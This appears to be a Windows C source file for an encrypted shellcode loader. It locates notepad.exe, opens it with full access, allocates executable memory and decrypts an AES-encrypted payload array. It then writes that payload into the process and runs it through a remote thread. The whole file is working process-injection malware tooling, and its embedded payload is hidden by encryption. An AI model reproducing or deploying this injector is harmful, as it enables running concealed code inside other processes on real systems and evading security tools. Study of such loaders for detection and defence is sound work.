#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "aes.h"


DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[!]";

unsigned char puke[] = {
"\x47\x6C\x39\x47\x67\x88\x8A\xF1\xD7\xD1\x9D\x32\x1B\x27\x25\xEB"
"\xA6\x9D\xD8\xCA\x10\x64\x77\xE6\x61\xD8\x1B\x27\x6B\x08\xAC\xDF"
"\x41\xB7\xF4\x13\x2F\x98\x9C\xE8\xF4\x56\x79\xDA\x39\x2E\x86\x32"
"\x3F\xAB\x7E\xE5\xE3\xE7\x73\xA3\x18\x73\x8B\x07\x12\x15\x1B\x41"
"\x89\xDD\xBE\x82\x3A\x38\xDF\x45\xD0\x7A\xF9\x54\x0D\x24\xD9\x6C"
"\x49\x58\xA2\xC4\xCC\xFF\xF2\x17\xE8\x5F\xAD\x39\x24\x00\x03\x6F"
"\x86\xEF\x2C\xB1\x64\xF8\xFB\x65\x2C\x04\x37\x8F\x1D\xFF\x41\xA2"
"\x7E\x6C\x03\xB0\x83\x08\x8D\x41\x7D\x1D\x35\x15\x68\x91\x8A\x57"
"\x09\x56\x4B\x20\x9F\x1D\x22\x25\x68\x90\xA6\x54\xF2\x19\xB1\xF9"
"\x0D\x8F\x9F\xBC\xB9\x11\x5E\xB5\xC2\x95\xCB\x40\x4D\x68\x2C\xAD"
"\x57\xD8\x49\x62\xBB\xA1\xAC\xC6\x90\x7C\xF0\x21\xA2\x28\x66\x34"
"\xF9\x2B\xEC\x77\x7A\xE9\xE8\xCB\x4D\xB3\xF8\xE0\x34\xC2\xB1\xF2"
"\x6C\x62\x4D\x11\xE9\x31\x9D\x08\xA7\xAE\x27\x7E\x92\x59\x39\xFF"
"\x7C\xB0\x0A\x11\xD4\xDF\x96\xD7\xA1\x19\xCB\x60\xF8\x68\xC7\x54"
"\x4A\x42\xA3\xDD\xB7\x0F\xBB\x58\xC5\x5E\xF2\x5E\x46\x6D\x9D\x97"
"\x7E\x58\x6E\x4F\xD9\x28\xE6\x8B\x6F\x81\x44\x22\x7E\x20\x80\x72"
"\x1D\xDE\x09\x96\x7C\x1D\x71\x60\x76\x77\x5A\x4A\xAD\xF6\x28\xE4"
"\x1F\x73\x57\x11\xE2\xD0\xE7\x03\x4E\x5F\x76\xF0\xEA\xC2\x34\xD4"
"\x49\x12\xBA\x24\x73\x7C\x48\x14\x0D\x74\xF0\xB5\x21\x65\x3F\x0A"
"\xB9\xD4\xA5\xFA\x49\x73\x16\xEB\xE6\x66\x01\x8D\x7A\x12\xBB\x5D"
"\x8E\x41\x1F\xAB\xA6\xFF\x30\xFC\x14\x0B\xC1\x0F\xB1\x3A\x3C\x29"
"\xB8\x3F\xA5\xB6\x36\x05\x23\x1B\x82\x0F\xDB\x63\x18\x4F\xF5\x24"
"\xB3\x2B\x64\x99\x99\xA7\xC7\x8F\xDB\xCF\x64\x93\xE1\xE7\x8B\xB9"
"\x50\x4E\x25\x3F\x2C\x6E\x85\xEB\x8C\xA0\xBF\x74\x8B\x91\x67\x5C"
"\xE0\xE8\x66\xB6\x0D\x0B\x8C\x67\x32\x5D\x09\x55\x97\xAF\x0D\xC3"
"\x56\xC3\x0B\x17\x8D\x5F\xF7\xE6\xF3\x8B\x36\x79\x96\xC1\xB3\x0F"
"\xD6\x60\x05\x9C\x20\x0E\x18\x93\x46\x88\x99\x58\x91\x93\xFA\x4C"
"\xA9\x2A\x78\xC2\x76\xD1\x0E\x19\x03\x42\x74\xA6\x76\x45\xB3\xC2"
"\x6E\x5A\xC3\xD1\xF5\xF2\xB6\x6A\xF5\x98\x7A\x81\xF8\x59\x71\x24"
"\x06\x17\x4C\xCE\xD1\x7D\xDA\x3D\xFA\x1B\x00\xD0\x0B\x4B\x37\x42"
"\xFA\x9E\x88\x4A\x4F\xAB\x50\xC9\x14\xCD\x42\x9A\x86\xFC\x23\x11"
"\x9F\xE4\x90\x62\x8E\x52\xAF\xD8\x9A\xDE\x44\x7C\x81\x39\xED\xBB"
"\x2B\xF8\x6B\x07\xF2\xB6\x15\xC1\x8B\x48\x77\x9E\xF1\x61\x72\xDA"
};

// 32 bytes
unsigned char pKey[] = {
	0xA3, 0xF1, 0x9C, 0x0E, 0x4B, 0x7D, 0x2A, 0x68,
	0x5E, 0x9D, 0x0C, 0x1B, 0x8F, 0x24, 0x76, 0xAA,
	0xD4, 0xE2, 0xF5, 0xC7, 0xB1, 0xA8, 0x09, 0x63,
	0x9F, 0x0A, 0x3C, 0x8E, 0x6B, 0x2D, 0x45, 0x71

};

// 16 bytes
unsigned char pIv[] = {
	0x7C, 0x2E, 0x9B, 0x4A, 0x1D, 0x6F, 0x08, 0xC3,
	0xF5, 0xA1, 0xE0, 0x73, 0x9B, 0x2C, 0x4D, 0x68
};


DWORD GetProcessIdByName(const char* processName) {

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (Process32First(hSnapshot, &pe32)) {
		do {
			if (_wcsicmp(pe32.szExeFile, processName) == 0) {
				CloseHandle(hSnapshot);
				return pe32.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return EXIT_SUCCESS;
}

int main(void) {
	
	// Get PID of process to inject in
	PID = GetProcessIdByName(L"notepad.exe");
	if (PID == 0) {
		printf("%s notepad.exe not found\n", e);
		return EXIT_FAILURE;
	}

	printf("%s notepad.exe PID: %lu\n", k, PID);

	// Open a handle to the process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (!hProcess) {
		printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the process!\n\\---0x%p", k, hProcess);

	// Allocate bytes to process memory
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(puke), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permission\n", k, sizeof(puke));

	// decrypting text 
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, pKey, pIv);
	AES_CBC_decrypt_buffer(&ctx, puke, sizeof(puke));

	printf("Decrypted text (hex):\n");

	for (size_t i = 0; i < sizeof(puke); i++) {
		// print each byte as \xHH
		printf("\\x%02X", puke[i]);

		// line break every 16 bytes for readability
		if ((i + 1) % 16 == 0)
			printf("\n");
	}

	printf("\n");


	// Actually write that allocated memory to the process memory
	WriteProcessMemory(hProcess, rBuffer, puke, sizeof(puke), NULL);

	printf("%s wrote %zu-bytes to process memory\n", k, sizeof(puke));

	// Create thread to run our payload
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (!hThread) {
		printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", k, TID, hThread);

	printf("%s waiting for thread to finish\n", i);

	WaitForSingleObject(hThread, INFINITE);

	printf("%s cleaning up\n", i);
	CloseHandle(hProcess);
	CloseHandle(hThread);
	printf("%s finished cleaning up\n", k);

	return EXIT_SUCCESS;
}